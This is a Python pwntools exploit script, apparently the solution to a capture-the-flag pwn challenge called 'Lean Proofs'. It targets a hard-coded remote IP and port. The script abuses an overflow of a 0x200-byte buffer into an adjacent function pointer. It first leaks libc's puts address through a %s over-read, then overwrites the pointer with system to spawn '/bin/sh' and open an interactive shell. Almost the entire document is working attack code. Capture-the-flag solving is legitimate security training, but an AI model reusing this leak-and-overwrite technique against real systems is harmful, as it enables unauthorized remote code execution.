#!/usr/bin/env python3
"""
Lean Proofs (CYBERBLITZ 2026, pwn, 409) — vtable-tail overflow -> ret2libc.

struct vtable { char lemma[0x200]; u64 left; u64 right; int(*proof)(const char*); };
read(0, lemma, sizeof(*a)=0x218) overflows lemma[0x200] into left/right/proof, and
a->proof(a->lemma) is then called.

  1. leak: proof method 4 sets proof = puts; send exactly 0x200 lemma bytes (no overflow,
     no NUL) so printf("%s", lemma) over-reads through left/right into the stored puts ptr.
  2. pwn:  overflow proof = system, lemma = "/bin/sh"  ->  system("/bin/sh").

Needs the provided libc.so.6 next to this script.  nc 45.77.247.35 22002
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('./libc.so.6', checksec=False)
PUTS, SYSTEM = libc.sym['puts'], libc.sym['system']

HOST, PORT = '45.77.247.35', 22002


def one(io, left, right, opt, lemma):
    io.recvuntil(b'left operand > ');  io.send(left)
    io.recvuntil(b'right operand > '); io.send(right)
    io.recvuntil(b'proof method > ');  io.send(opt)     # e.g. b'4\n'
    io.recvuntil(b'lemma > ');         io.send(lemma)


def main():
    io = remote(HOST, PORT)

    # --- round 1: leak libc puts via the %s over-read (0x200 bytes, no overflow) ---
    one(io, b'A' * 8, b'B' * 8, b'4\n', b'C' * 0x200)
    io.recvuntil(b'YOUR LEMMA: ')
    leaked = io.recvline()[0x210:].rstrip(b'\n')          # 0x200 C + 8 A + 8 B, then puts
    base = u64(leaked[:6].ljust(8, b'\x00')) - PUTS
    log.success('libc base = %#x', base)
    io.recvuntil(b'theorem... > '); io.send(b'\n')

    # --- round 2: overflow proof -> system, lemma -> "/bin/sh" ---
    payload = b'/bin/sh\x00' + b'A' * (0x200 - 8) + p64(0) + p64(0) + p64(base + SYSTEM)
    assert len(payload) == 0x218
    one(io, b'A' * 8, b'B' * 8, b'1\n', payload)
    io.recvuntil(b'theorem... > '); io.send(b'\n')        # triggers a->proof(a->lemma)

    io.interactive()


if __name__ == '__main__':
    main()
